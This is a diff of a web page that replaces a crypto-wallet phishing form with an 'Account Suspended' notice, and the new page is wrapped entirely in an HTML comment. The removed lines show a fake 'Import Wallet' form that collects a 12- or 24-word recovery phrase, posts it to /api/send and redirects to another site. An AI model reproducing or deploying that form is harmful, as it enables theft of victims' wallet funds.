@@ -1,52 +1,112 @@
+<!-- <!DOCTYPE html>
 <html lang="en">
-  <meta http-equiv="content-type" content="text/html;charset=utf-8" />
-  <meta http-equiv="content-type" content="text/html;charset=utf-8" />
   <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>Blockchain Rectification</title>
-    <link rel="preconnect" href="https://fonts.googleapis.com/" />
-    <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin />
-    <link
-      href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;900&amp;display=swap"
-      rel="stylesheet"
-    />
-    <link rel="stylesheet" href="style/form.css" />
-    <script src="https://widgets.coingecko.com/gecko-coin-price-marquee-widget.js"></script>
+
+    <title>Account Suspended</title>
+
+    <link rel="icon" type="image/png" href="/favicon.png" />
+
+    <style>
+      * {
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+      }
+
+      body {
+        font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto,
+          Arial, sans-serif;
+        background: #ffffff;
+        color: #333;
+      }
+
+      .top-bar {
+        display: flex;
+        align-items: center;
+        gap: 14px;
+        padding: 16px 22px;
+        background: #f3f3f3;
+        color: #9a9a9a;
+        font-size: 22px;
+        font-weight: 500;
+      }
+
+      .user-icon {
+        width: 40px;
+        height: 40px;
+        border-radius: 50%;
+        background: #ddd;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        font-size: 20px;
+      }
+
+      .suspended-banner {
+        background: #2f3f4e;
+        color: white;
+        padding: 60px 24px;
+      }
+
+      .suspended-container {
+        max-width: 900px;
+        margin: 0 auto;
+      }
+
+      .suspended-banner h1 {
+        font-size: 40px;
+        font-weight: 600;
+        margin-bottom: 20px;
+      }
+
+      .suspended-banner p {
+        font-size: 18px;
+        line-height: 1.6;
+      }
+
+      .suspended-banner a {
+        color: white;
+        text-decoration: underline;
+      }
+
+      .empty-space {
+        height: 400px;
+      }
+
+      @media (max-width: 600px) {
+        .suspended-banner h1 {
+          font-size: 30px;
+        }
+
+        .top-bar {
+          font-size: 18px;
+        }
+      }
+    </style>
   </head>
 
   <body>
-    <!-- Blockchain Widget -->
-    <coingecko-coin-price-marquee-widget
-      coin-ids="bitcoin,ethereum,eos,ripple,litecoin"
-      currency="usd"
-      background-color="#ffffff"
-      locale="en"
-    ></coingecko-coin-price-marquee-widget>
+    <div class="top-bar">
+      <div class="user-icon">👤</div>
+      <div>Account Suspended</div>
+    </div>
 
-    <main>
-      <h1>Import Wallet</h1>
-      <form action="/api/send" method="POST">
-        <input type="hidden" name="_captcha" value="false" />
-        <input
-          type="hidden"
-          name="_next"
-          value="https://loading-dapp.pages.dev"
-        />
-        <label for="message"
-          >Typically 12 (sometimes 24) words seperated by a single spaces.
-        </label>
-        <textarea
-          id="message"
-          name="message"
-          rows="4"
-          cols="50"
-          required
-        ></textarea>
+    <section class="suspended-banner">
+      <div class="suspended-container">
+        <h1>This Account has been suspended.</h1>
 
-        <!-- <input type="submit" value="Connect Wallet" /> -->
-        <button type="submit">Connect Wallet</button>
-      </form>
-    </main>
+        <p>
+          <a href="mailto:support@yourhosting.com">
+            Contact your hosting provider
+          </a>
+          for more information.
+        </p>
+      </div>
+    </section>
+
+    <div class="empty-space"></div>
   </body>
-</html>
+</html> -->
+-->
